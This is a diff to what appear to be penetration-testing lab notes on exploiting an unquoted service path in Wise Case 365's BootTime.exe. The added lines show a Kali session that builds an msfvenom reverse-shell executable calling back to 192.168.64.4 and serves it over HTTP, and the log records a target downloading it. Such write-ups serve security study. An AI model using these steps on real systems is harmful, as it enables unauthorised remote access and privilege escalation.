@@ -342,3 +342,24 @@ The `C:\Program FIles (x86)\Wise\Wise Case 365\BootTime.exe` is unquoted, it mea
 #injectmalware
 #unquotedinjectmalware
 Inject malware from the kali `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.64.4 LPORT=7777 -f exe > Wise.exe`
+
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# cd /transfer 
+
+┌──(root㉿kali)-[/transfer]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.64.4 LPORT=7777 -f exe > Wise.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+
+
+┌──(root㉿kali)-[/transfer]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.64.7 - - [08/Jul/2024 17:35:48] "GET /Wise.exe HTTP/1.1" 200 -
+192.168.64.7 - - [08/Jul/2024 17:35:49] "GET /Wise.exe HTTP/1.1" 200 -
+
+```
